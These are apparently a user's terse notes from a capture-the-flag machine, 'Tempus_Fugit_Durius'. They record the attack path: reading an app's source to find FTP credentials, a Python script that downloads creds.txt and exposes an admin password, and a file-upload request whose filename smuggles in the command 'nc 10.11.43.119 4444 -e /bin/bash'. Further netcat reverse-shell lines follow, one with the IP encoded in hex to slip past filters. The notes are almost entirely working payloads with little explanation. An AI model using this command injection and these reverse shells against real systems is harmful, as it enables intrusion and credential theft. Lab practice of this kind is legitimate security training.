# Tempus_Fugit_Durius 

> VOiD | Monday 16 August 2021 12:19:20 AM IST

My IP : 10.11.43.119
Target IP : 



# PORT 80
/uploads
takes txt and rtf formats



```bash

user www
cat /app/main.py

ftp = FTP('ftp.mofo.pwn')
ftp.login('someuser', '04653cr37Passw0rdK06')

```

```py


# Import Module
import ftplib
  
# Fill Required Information
HOSTNAME = "ftp.mofo.pwn"
USERNAME = "someuser"
PASSWORD = "04653cr37Passw0rdK06"


# Connect FTP Server
ftp_server = ftplib.FTP(HOSTNAME, USERNAME, PASSWORD)
  
# force UTF-8 encoding
ftp_server.encoding = "utf-8"


# Get list of files
ftp_server.dir()

# creds.txt


# Enter File Name with Extension
filename = "creds.txt"
  
# Write file in binary mode
with open(filename, "wb") as file:
    # Command for Downloading the file "RETR filename"
    ftp_server.retrbinary(f"RETR {filename}", file.write)

```

```bash

admin:BAraTuwwWzx3gG


```


```

------WebKitFormBoundaryKPjXbUBwLXbH903Y
Content-Disposition: form-data; name="file"; filename="h.txt ;nc 10.11.43.119 4444 -e /bin/bash"
Content-Type: text/plain

hey


```
in file name put this : =


nc 10.11.43.119 4444 -e /bin/bash
0x0a0b2b77
nc 0x0a0b2b77 4 -e sh